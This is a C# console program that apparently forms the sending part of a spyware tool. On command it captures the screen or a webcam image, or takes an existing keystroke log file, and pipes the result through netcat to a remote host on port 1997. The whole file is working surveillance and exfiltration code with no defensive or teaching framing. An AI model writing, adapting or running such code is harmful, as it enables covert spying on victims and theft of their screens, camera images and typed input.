using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Send
{
    class Program
    {
        static void Main(string[] args)
        {
            string userCall = args[0];

            string command = string.Empty;
            Process commandLine = new Process();
            commandLine.StartInfo.FileName = "cmd.exe";
            commandLine.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            commandLine.StartInfo.UseShellExecute = false;

            Console.WriteLine();
            
            switch (userCall.ToLower())
            {
                case "-s":
                    {
                        TakeScreenShot();
                        command = string.Format("/c nc -v -w 3 {0} 1997 < cap.png",args[1]);
                        break;
                    }
                case "-k":
                    {
                        command = string.Format("/c nc -v -w 3 {0} 1997 < log.txt", args[1]);
                        break;
                    }
                case "-m":
                    {
                        TriggerCameraCapture();
                        command = string.Format("/c nc -v -w 3 {0} 1997 < image.bmp", args[1]);
                        break;
                    }
                default:
                    {
                        command = string.Format("/c echo invalid command");
                        break;
                    }
            }


            commandLine.StartInfo.Arguments = command;
            ThreadStart ths = new ThreadStart(() => commandLine.Start());
            Thread th = new Thread(ths);
            th.Start();
        }

        /// <summary>
        /// Takes a picture using the host's built-in camera
        /// </summary>
        private static void TriggerCameraCapture()
        {
            Process commandLine = new Process();
            commandLine.StartInfo.FileName = "cmd.exe";
            commandLine.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            commandLine.StartInfo.UseShellExecute = false;
            commandLine.StartInfo.Arguments = "/c CommandCam";
            commandLine.Start();
        }

        /// <summary>
        /// Takes a screenshot of the hosts screen
        /// </summary>
        private static void TakeScreenShot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(Application.StartupPath + @"\cap.png", ImageFormat.Png);
        }
    }
}
